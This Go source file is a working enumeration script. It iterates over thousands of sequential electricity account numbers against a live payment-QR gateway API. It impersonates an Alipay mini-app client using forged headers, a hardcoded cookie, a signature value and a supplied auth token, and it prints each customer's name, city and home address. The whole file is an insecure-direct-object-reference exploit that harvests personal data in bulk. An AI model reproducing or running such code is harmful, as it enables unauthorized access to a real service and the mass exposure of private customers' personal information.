package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"github.com/bitly/go-simplejson"
	"github.com/panjf2000/ants/v2"
	"io/ioutil"
	"net/http"
	"strings"
	"sync"
	"time"
)

type arg struct {
	token string
}
var args arg


//const token = "IdUNaddkzlOokExq/tKKzHK1R7wbzWk4ADGt97Eyj51A/qR4tUVL0gaq7H7CMgrr"

type params struct {
	Method      string `json:"method"`
	Biz_content biz    `json:"biz_content"`
	App_id      string `json:"app_id"`
	Sign_type   string `json:"sign_type"`
}
type biz struct {
	ConsNo string `json:"consNo"`
}

type result struct {
	consNo   string
	elecAddr string
	consName string
	city     string
}

var p params

func main() {
	fmt.Println("正在批量获取户号范围：3062365000-3062369999的户号信息，总计4999个请求...")
	flag.StringVar(&args.token,"authtoken","","传入authtoken")
	flag.Parse()
	Testing("https://mddl.bangdao-tech.com/gateway.do")
}

func Testing(URL string) {
	p.Method = "bangdao.qrcode.consNoQuery"

	p.Biz_content.ConsNo = ""
	p.App_id = "2019091867545674"
	p.Sign_type = "token"

	var wg sync.WaitGroup

	p, _ := ants.NewPoolWithFunc(5, func(s interface{}) {
		requets(URL, s.(int))
		wg.Done()
	})
	defer p.Release()
	//5000->6783
	//3062365000-3062369999
	for i := 3062366700; i < 3062369999; i++ {
		wg.Add(1)
		_ = p.Invoke(i)
	}
	wg.Wait()
}

func requets(URL string, count int) {
	var results = result{}

	p.Biz_content.ConsNo = fmt.Sprintf("%d", count)
	//构造请求参数和超时信息
	client := &http.Client{Timeout: 5 * time.Second}

	marshal, err := json.Marshal(p)

	if err != nil {
		fmt.Println(URL, "构造请求参数错误")
	}
	//请求结束后关闭连接
	defer client.CloseIdleConnections()
	request, reqErr := http.NewRequest("POST", URL, strings.NewReader(string(marshal)))
	if reqErr != nil {
		fmt.Println(URL, "构造请求错误")
	} else {
		request.Header.Add("Host", "]mddl.bangdao-tech.com")
		request.Header.Add("Accept", "*/*")
		request.Header.Add("Accept-Charset", "utf-8")
		request.Header.Add("authtoken", args.token)
		request.Header.Add("Accept-Encoding", "gzip, deflate, br")
		request.Header.Add("Accept-Language", "zh-CN,en-US;q=0.8")
		request.Header.Add("Content-Type", "application/json")
		request.Header.Add("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18E199 Ariver/1.1.0 AliApp(AP/10.2.23.6000) Nebula WK RVKType(0) AlipayDefined(nt:WIFI,ws:375|748|3.0) AlipayClient/10.2.23.6000 Language/zh-Hans Region/CN NebulaX/1.0.0")
		request.Header.Add("Referer", "https://2019091867545674.hybrid.alipay-eco.com/2019091867545674/0.2.2104101836.28/index.html#pages/query/query?__appxPageId=101&__id__=1")
		request.Header.Add("alipayMiniMark", "r2G7oShEzWEXhLgP1fSkwarRgn6DhqOJo2BHgaYu/RAb1SkXOqrCeNl0PO5VBdN5MNrkLE/oEBkgyJ2HUFb+HiSismCmm8HORtiQ6arShGI=")
		request.Header.Add("Cookie", "acw_tc=781bad2016228147250527492e6a4562ac509acb5726a8aa132d80afe9f8dd")

		response, err := client.Do(request)

		if err != nil {
			fmt.Println(URL, "请求错误")
		} else {
			defer response.Body.Close()
			all, err := ioutil.ReadAll(response.Body)
			//fmt.Println(string(all))

			if err != nil {
				fmt.Println(URL, "读取响应失败")
			}
			newJson, err := simplejson.NewJson(all)
			if err != nil {
				//fmt.Println(string(all), "json解析失败")
			} else {
				results.consNo,err = newJson.Get("content").Get("rtnData").Get("consNo").String()
				results.city,err = newJson.Get("content").Get("rtnData").Get("city").String()
				results.elecAddr,err = newJson.Get("content").Get("rtnData").Get("elecAddr").String()
				results.consName,err = newJson.Get("content").Get("rtnData").Get("consName").String()
				if err != nil {
					//fmt.Println("没有值")
				} else {
					data:=fmt.Sprintf("户号：%s 城市：%s 地址：%s 户名：%s",results.consNo,results.city,results.elecAddr,results.consName)
					fmt.Println(data)
				}
			}
		}
	}
}
